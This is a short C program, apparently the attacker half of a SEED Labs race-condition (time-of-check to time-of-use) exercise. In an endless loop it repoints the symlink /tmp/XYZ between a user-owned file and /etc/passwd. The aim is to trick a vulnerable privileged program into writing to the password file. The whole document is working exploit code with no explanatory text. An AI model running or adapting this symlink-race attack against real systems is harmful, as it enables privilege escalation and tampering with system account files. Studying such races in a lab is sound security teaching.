#include <unistd.h>

int main(){
	while(1){
		unlink("/tmp/XYZ");
		symlink("/home/seed/Desktop/lab4/my_own_file","/tmp/XYZ");
		usleep(10000);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd","/tmp/XYZ");
		usleep(10000);
	}
}